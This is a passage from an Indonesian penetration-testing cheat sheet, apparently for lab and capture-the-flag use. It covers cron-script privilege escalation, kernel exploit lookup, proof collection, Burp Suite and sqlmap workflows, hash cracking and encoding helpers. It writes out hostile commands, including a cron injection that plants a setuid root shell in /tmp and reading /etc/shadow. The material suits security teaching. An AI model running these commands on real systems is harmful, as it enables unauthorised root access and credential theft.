echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /path/script_cron.sh
# tunggu cron jalan, lalu:
/tmp/rb -p
```

## Kernel Exploit (LPE)

**Untuk apa:** kernel usang punya exploit privesc (mis. DirtyPipe, DirtyCow). Pilihan terakhir (bisa crash sistem).

```bash
uname -r                                    # cek versi kernel
searchsploit linux kernel <versi>           # cari exploit lokal
# contoh: DirtyPipe (CVE-2022-0847) untuk kernel 5.8–5.16.11
```

---

# 05 — Proof / Reporting

**Untuk apa:** dokumentasi bukti keberhasilan untuk laporan.

```bash
# Bukti akses root
id                          # tunjukkan uid=0(root)
hostname; ip a              # identitas mesin
cat /root/proof.txt         # flag/proof root
cat /etc/shadow | head      # bukti akses file sensitif (hanya root)

# Ambil flag lab (format NCD{...})
grep -rR "NCD{" /var/www 2>/dev/null
find / -name "flag*" 2>/dev/null
```

**Struktur laporan pentest yang baik:**

1. **Executive Summary** — ringkasan untuk manajemen (risiko bisnis, non-teknis)
2. **Scope & Methodology** — target, batasan, standar (OWASP/PTES)
3. **Findings** — per temuan: Deskripsi, **CVSS/Severity**, PoC (langkah + screenshot), Impact
4. **Remediation** — rekomendasi perbaikan konkret per temuan
5. **Appendix** — raw output, tools, timeline

---

# Tooling: Burp Suite & Proxy

**Untuk apa:** intercept, modifikasi, dan replay request HTTP secara manual — inti dari web pentest manual.

## Setup Proxy

```bash
# Burp default listen di 127.0.0.1:8080
# 1. Set proxy browser ke 127.0.0.1:8080 (atau pakai FoxyProxy)
# 2. Install CA cert Burp agar bisa intercept HTTPS:
#    browser → http://burp → "CA Certificate" → import ke browser

# Route curl lewat Burp (debug dari terminal)
curl -x http://127.0.0.1:8080 -k http://<TARGET>/

# Route tool CLI lain lewat Burp (mis. sqlmap, ffuf)
sqlmap -u "http://<TARGET>/?id=1" --proxy="http://127.0.0.1:8080" --dbs
ffuf -w list.txt -u "http://<TARGET>/FUZZ" -x http://127.0.0.1:8080
```

## Fitur Utama Burp

| Tab | Fungsi |
|-----|--------|
| **Proxy → Intercept** | Tahan request untuk diedit sebelum dikirim |
| **Proxy → HTTP history** | Log semua request/response yang lewat |
| **Repeater** (`Ctrl+R`) | Kirim ulang & modifikasi 1 request berkali-kali (uji payload) |
| **Intruder** (`Ctrl+I`) | Otomasi fuzzing/brute-force pada posisi payload |
| **Decoder** | Encode/decode base64, URL, HTML, hex |
| **Comparer** | Bandingkan 2 response (cari perbedaan halus) |
| **Collaborator** | Deteksi interaksi out-of-band (SSRF, blind XSS/SQLi) |

## Intruder — Attack Types

**Untuk apa:** memilih pola injeksi payload saat brute-force/fuzzing.

| Tipe | Kegunaan |
|------|----------|
| **Sniper** | 1 payload set, 1 posisi bergiliran (fuzz satu parameter) |
| **Battering ram** | 1 payload set, semua posisi sama serentak |
| **Pitchfork** | Multi payload set, paralel (mis. user+pass berpasangan) |
| **Cluster bomb** | Multi payload set, semua kombinasi (brute-force kredensial) |

## Ekstraksi Request untuk Tool Lain

```bash
# Save request dari Burp (kanan → "Copy to file" / "Save item") lalu:
sqlmap -r request.txt --batch --dbs          # sqlmap baca raw request
ffuf -request request.txt -w list.txt        # ffuf pakai raw request sebagai template
```

> **Alternatif Burp:** **OWASP ZAP** (gratis/open-source), **mitmproxy** (CLI), **caido** (modern, ringan).

---

# Lampiran: Encoding & Utility

**Untuk apa:** encoding/decoding cepat saat crafting payload atau analisis.

```bash
# Base64
echo -n "data" | base64                 # encode
echo "ZGF0YQ==" | base64 -d             # decode

# URL encode/decode (python)
python3 -c "import urllib.parse;print(urllib.parse.quote('<?php system(1); ?>'))"
python3 -c "import urllib.parse;print(urllib.parse.unquote('%3Cphp%3E'))"

# Decode Basic Auth header
echo "dHJhaW5pbmc6cGFzcw==" | base64 -d   # → training:pass

# Hash cracking
hashcat -m 0 hash.txt rockyou.txt         # MD5
john --wordlist=rockyou.txt hash.txt

# HTTP server cepat (transfer file ke target)
python3 -m http.server 8000

# Raw HTTP request tanpa Burp
printf 'GET /path HTTP/1.1\r\nHost: target\r\n\r\n' | nc target 80
```

## URL Encoding Karakter Penting

| Karakter | Encoded | | Karakter | Encoded |
|----------|---------|-|----------|---------|
| spasi | `%20` | | `'` | `%27` |
| `<` | `%3C` | | `"` | `%22` |
| `>` | `%3E` | | `#` | `%23` |
| `/` | `%2F` | | `&` | `%26` |
| `:` | `%3A` | | newline | `%0a` |

---

## 🔗 Referensi

- [w4h4z/Pentest-Cheat-Sheet](https://github.com/w4h4z/Pentest-Cheat-Sheet/) — struktur dasar
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io) · [revshells.com](https://www.revshells.com) · [HackTricks](https://book.hacktricks.xyz)
- [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

---

*Gunakan secara etis & hanya pada sistem yang diotorisasi.*
